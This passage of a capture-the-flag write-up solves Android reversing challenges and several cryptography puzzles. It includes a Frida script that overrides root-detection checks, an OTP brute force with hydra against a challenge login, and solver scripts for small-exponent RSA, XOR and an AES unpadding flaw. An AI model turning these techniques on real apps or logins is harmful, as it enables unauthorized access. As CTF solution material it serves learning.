        try {
            encryptStringWithBase64String(ivStr, keyStr, flag);
        } catch (Exception e) {
            System.out.println(e);
        }
        System.out.print("The nextLine method is used to read the string");
    }
}
```

![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087059455323160718/image.png)

### Evil-Access
Running the app on android studio, it's a ``flutter`` app. I decompiled it using ``apklab``. Searching online I found that there is a ``kernel_blob.bin`` file in ``assets/flutter_assets``. Running ``strings`` on it reveals some part of the source code.
![flutter](https://cdn.discordapp.com/attachments/875457441574297623/1087060128399884338/image.png)
The login credentials are there in the source encoded in base64. However we can directly get the flag.
![concat](https://cdn.discordapp.com/attachments/875457441574297623/1087060155495088240/image.png)
by concatenating these 8 strings.

### Rooter 
Once again I decompiled this apk using apklab. The main function has this function:
![Main](https://cdn.discordapp.com/attachments/875457441574297623/1087061336833404949/image.png)
The generate function gives the flag if run with the argument "Game_Stranger". In the above picture, the value was something else. I tried to patch it to that and recompile but it did not work.
![generate](https://cdn.discordapp.com/attachments/875457441574297623/1087061884705976451/image.png)

These functions need to be result in ``true`` for us to hit the generate function.
![check](https://cdn.discordapp.com/attachments/875457441574297623/1087061968034222180/image.png)

I tried to patch the app and it did not work so I just used ``frida``.
My code is:
```
//hook3.js
Java.perform(function() {
    console.log("[ * ] Starting implementation override...")

    var MainActivity = Java.use("com.io.junroot.MainActivity");
    MainActivity.checknotroot.implementation = function() {
        return true;
    }

    MainActivity.checkroot.implementation = function() {
        return true;
    }

    var string_class = Java.use("java.lang.String");
    MainActivity.generate.overload("java.lang.String").implementation = function(key) {
        console.log("Key: " + key);
        var my_string = string_class.$new("Game_Stranger");
        this.generate(my_string);
    }
});
```
I am basically overriding checkroot and checknotroot to always make them return true. I am also overriding the generate function and forcing the argument to be ``Game_Strange`` instead of ``myValue`` which is the default.
![frida](https://cdn.discordapp.com/attachments/875457441574297623/1087070123195629638/image.png)
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087067910767382669/image.png)

### es-es-pin
In this case, I decompiled once again and saw this function:
![java](https://cdn.discordapp.com/attachments/875457441574297623/1087073892742463498/image.png)
I read writeups and tried to open the jni library in ghidra. Frankly, I couldn't make heads or tails of it.
The app wouldn't even run on android studio so I decided to try and look at logs.
![error](https://cdn.discordapp.com/attachments/875457441574297623/1087073811184238612/image.png)
Well a quick search on google told me how to fix it. Behold, my updated ``AndroidManifest.xml ``
```
<?xml version="1.0" encoding="UTF-8"?>  <manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="33" android:compileSdkVersionCodename="13" package="com.io.sslpinner" platformBuildVersionCode="33" platformBuildVersionName="13">  <permission android:name="com.io.sslpinner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature" />  <uses-permission android:name="com.io.sslpinner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />  <uses-permission android:name="android.permission.INTERNET" />  <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules" android:debuggable="true" android:fullBackupContent="@xml/backup_rules" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.Sslpinner" android:networkSecurityConfig="@xml/nsc_mitm">  <activity android:exported="true" android:name="com.io.sslpinner.MainActivity">  <intent-filter>  <action android:name="android.intent.action.MAIN" />  <category android:name="android.intent.category.LAUNCHER" />  </intent-filter>  <meta-data android:name="android.app.lib_name" android:value="" />  </activity>  <provider android:authorities="com.io.sslpinner.androidx-startup" android:exported="false" android:name="androidx.startup.InitializationProvider">  <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup" />  <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup" />  </provider>  </application>  </manifest>
```
where I added 
```
<uses-permission  android:name="android.permission.INTERNET"/>
```

I used apklab to rebuild the apk and the logs gave me the flag:
![ssl](https://cdn.discordapp.com/attachments/875457441574297623/1087073594925908129/image.png)

### OTP_Slayer
Once again, I decompiled the apk. I came across this function:
![otp](https://cdn.discordapp.com/attachments/875457441574297623/1087077366574100541/image.png)
I found the url it is posting to in ``strings.xml``
![url](https://cdn.discordapp.com/attachments/875457441574297623/1087077489001631825/image.png)
I created a new user using the ``newUser.php`` in the same ``strings.xml`` file.
![newuser](https://cdn.discordapp.com/attachments/875457441574297623/1087078383122403328/image.png)
Then I tried entering the projected otp:
![login](https://cdn.discordapp.com/attachments/875457441574297623/1087078695497367552/image.png)
The OTP was expired so I tried another number:
![login](https://cdn.discordapp.com/attachments/875457441574297623/1087078755106832414/image.png)
I tried a lot of things now. I used dirsearch and found a ``/db.php`` endpoint. So I tried sql injection. I went through the apk source code to find anything more useful but I couldn't so I thought maybe the next otp may be correct might mean the otp is above 446620 and decided to bruteforce. I did try bruteforcing from 0 but quickly gave up and decided to start from 446620.
So i ran hydra.
![hydra](https://cdn.discordapp.com/attachments/875457441574297623/1087079617493483630/image.png)

This otp gave m the flag. Turns out it is a static value.
![otp](https://cdn.discordapp.com/attachments/875457441574297623/1087079674942853140/image.png)

## Cryptography
### double_or_nothing
We are given this data ``Data: Umt4QlIzdGxZWE41VUdWaFdsbGZjbWxuYUhRL2ZRbz0K``.
It looks like ``base64`` string and going by the challenge name it's probably ``double base64``. I popped it in CyberChef and got the flag.
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087080315568263370/image.png)

### Silly Freemason
![challenge](https://cdn.discordapp.com/attachments/875457441574297623/1087080700496326656/image.png)
[decode.fr](https://www.dcode.fr/pigpen-cipher) has a decoder for this.
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087081082475794573/image.png)

### Riv
We are given the following data:
```
n=16147111734460800396004592670421468929337203190257626881606012921435838643682486839638969919126011524499609044486548371078702382995209772340989167246102495015107720926778322642181742667106589581285868164349155811160988904172418976556526686941401355790760512930187413129387612432578824982589943249726538251843134494371205312446417743116926422296053343015812167511415786346049084785782293317209821769860285282759086233935620489199236381431918736093892708407699240019615286528179061459943754101031540022336347845482100465143834304730276518967143705254840069157949656506425821092281518997158195127056924848015561721144141

e=5

ct=111558645679006394985384019922106344256390245431545304101942130922177467904633500612867289903603121371437773246170390092045034734209187474652129636135263800118498886868963176721482556951317449397588032806400411456314451471867958481146150654899999731639797463584634515914586016365684332024632542448233024172820905812188634527134114383199826766449312686149601042672866478590545407942592434984704530370917178774467061817245773716440844189325157951539629919700395694364926837338497933420304953156481808563506013769102906246159631644750831210893
```

I noticed that e is unusually small. [This link](https://crypto.stackexchange.com/questions/6770/cracking-an-rsa-with-no-padding-and-very-small-e) told me what to do. 
```
import libnum
from Crypto.Util.number import bytes_to_long
from Crypto.Util.number import long_to_bytes

n = 16147111734460800396004592670421468929337203190257626881606012921435838643682486839638969919126011524499609044486548371078702382995209772340989167246102495015107720926778322642181742667106589581285868164349155811160988904172418976556526686941401355790760512930187413129387612432578824982589943249726538251843134494371205312446417743116926422296053343015812167511415786346049084785782293317209821769860285282759086233935620489199236381431918736093892708407699240019615286528179061459943754101031540022336347845482100465143834304730276518967143705254840069157949656506425821092281518997158195127056924848015561721144141
e = 5
ct = 111558645679006394985384019922106344256390245431545304101942130922177467904633500612867289903603121371437773246170390092045034734209187474652129636135263800118498886868963176721482556951317449397588032806400411456314451471867958481146150654899999731639797463584634515914586016365684332024632542448233024172820905812188634527134114383199826766449312686149601042672866478590545407942592434984704530370917178774467061817245773716440844189325157951539629919700395694364926837338497933420304953156481808563506013769102906246159631644750831210893
m = libnum.nroot(ct, e)
print(long_to_bytes(m))
```
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087082288325599293/image.png)

### G(OLD)
The challenge description:
```
ciphertext = "1e03130e2800130119041b07141d190b0a100500070a0e110c10190c0a1d0817070c1d061f1d6039"

NOTE : 
	- flag format is : FLAG{}
	- All chars are in uppercase 
	- key length is 8
```
I figured it might be a xor task. We know the plaintext starts with ``FLAG{`` and ends with ``}`` and the key length is ``8``. Since xor is a reversible operation, we already have 6 out 8 character of the key. So it is just a 2 character bruteforce. However, in this case the remaining 2 characters were guessable. I got the key ``XORISXXD`` so I guessed that is is actually ``XORISBAD``.
```
cipher = (
    "1e03130e2800130119041b07141d190b0a100500070a0e110c10190c0a1d0817070c1d061f1d6039"
)
cipher = bytearray.fromhex(cipher)
cipher = [x for x in cipher]
flag = "FLAG{"
key = [0, 0, 0, 0, 0, "B", "A", 0]
key[0] = chr(cipher[0] ^ ord(flag[0]))
key[1] = chr(cipher[1] ^ ord(flag[1]))
key[2] = chr(cipher[2] ^ ord(flag[2]))
key[3] = chr(cipher[3] ^ ord(flag[3]))
key[4] = chr(cipher[4] ^ ord(flag[4]))
key[7] = chr(cipher[len(cipher) - 1] ^ ord("}"))

print(key)
f = ""
for i in range(len(cipher)):
    f += chr(cipher[i] ^ ord(key[i % 8]))

print(f)
```
![flag](https://cdn.discordapp.com/attachments/875457441574297623/1087083609413910652/image.png)

### IPad
We are a given a ``challenge.py`` file. 
Looking at the unpad function:
```
def unpad(t):
    l = len(t) - t[-1]
    res = b""
    for i in range(l):
        res += bytes([t[i]])
    return res


def aes_decrypt(key, ct):
    return unpad(AES.new(key, AES.MODE_ECB).decrypt(ct))
```
As we can see, the decrypted message is passed to the unpad function. the line ``l = len(t) - t[-1]`` subtracts the length of the decrypted message which is ``64`` and the value of the last byte of the decrypted message. We will come back to this.

```
KEY = urandom(BLOCK_SIZE)


def generate_secret(length):
    return bytes(random.randint(ord("0"), ord("?")) for _ in range(length))


SECRET = generate_secret(SECRET_LENGTH)
ENCRYPTED_SECRET = aes_encrypt(KEY, SECRET)


def get_flag():
    print(f"Encrypted secret (in hex): {h(ENCRYPTED_SECRET).decode()}")
    secret = u(input("Secret (in hex): "))
    if secret == aes_decrypt(KEY, ENCRYPTED_SECRET):
        print(f"Flag: {FLAG}")
        exit()
    else:
        print("Wrong answer!")
```

Clearly, our goal is to 'guess' the secret. ``KEY`` is random for every new process and so is ``SECRET``. Owing to this randomness, there can be a case when the last byte of the decrypted secret happens to be ``?`` whose value is ``63``. This would cause `l` from unpad to be `1`.
```
    for i in range(l):
        res += bytes([t[i]])
    return res
```

Then this part of unpad will return exactly ``1 byte``. Which means this challenge is simply a ``1 byte bruteforce``.

```
from pwn import *


def pwn():
    io = remote("127.0.0.1", 1337)
    io.recvuntil(b"> ")
    for i in range(ord("0"), ord("?") + 1):
        io.sendline(b"3")
        io.recvline()
        io.recvuntil(b": ")
        io.sendline(hex(i)[2:].encode())
        answer = io.recvuntil(b"> ")
        print(answer)
        if b"Wrong" not in answer:
            print(answer)
            exit()
    io.close()


while True:
    pwn()

```
This script simply opens a process, tries to send a byte from the SECRET'S charset till it is correct. If not, it will open another process and try again.

![byte](https://cdn.discordapp.com/attachments/875457441574297623/1087090157225787392/image.png)
